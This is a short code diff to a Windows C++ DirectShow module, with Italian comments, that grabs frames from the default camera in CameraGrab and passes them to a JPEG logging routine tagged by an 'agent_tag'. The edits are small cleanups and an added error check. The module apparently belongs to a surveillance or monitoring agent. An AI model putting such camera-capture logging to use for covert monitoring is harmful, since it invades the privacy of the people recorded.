@@ -12,21 +12,23 @@
 // Definita in BitmapCommon
 extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
 
-void FreeMediaType(AM_MEDIA_TYPE& mt)
+static void FreeMediaType(AM_MEDIA_TYPE& mt)
 {
-    if (mt.cbFormat != 0) {
+    if (mt.cbFormat != 0)
+	{
         CoTaskMemFree((PVOID)mt.pbFormat);
         mt.cbFormat = 0;
         mt.pbFormat = NULL;
     }
-    if (mt.pUnk != NULL) {
+    if (mt.pUnk != NULL)
+	{
         // pUnk should not be used.
         mt.pUnk->Release();
         mt.pUnk = NULL;
     }
 }
 
-void DeleteMediaType(AM_MEDIA_TYPE *pmt)
+static void DeleteMediaType(AM_MEDIA_TYPE *pmt)
 {
     if (pmt != NULL) {
         FreeMediaType(*pmt); 
@@ -75,7 +77,7 @@ void GetDefaultCapDevice(IBaseFilter **ppCap)
 				break;
 
 			// Ask for the actual filter
-			hr = pM->BindToObject(0,0,IID_IBaseFilter, (void **)ppCap);
+			hr = pM->BindToObject(NULL, NULL, IID_IBaseFilter, (void **)ppCap);
 			SAFE_RELEASE(pM);
 			if(*ppCap)
 				break;
@@ -106,7 +108,11 @@ void CameraGrab(DWORD quality)
 	IEnumPins				*pEnum = NULL;
 	IPin					*pPin = NULL;
 
-	CoInitialize(NULL);
+	if (CoInitialize(NULL) != S_OK)
+	{
+		return;
+	}
+
 	do {
 		// crea il filtergraph manager
 		hr = CoCreateInstance(	CLSID_FilterGraph,
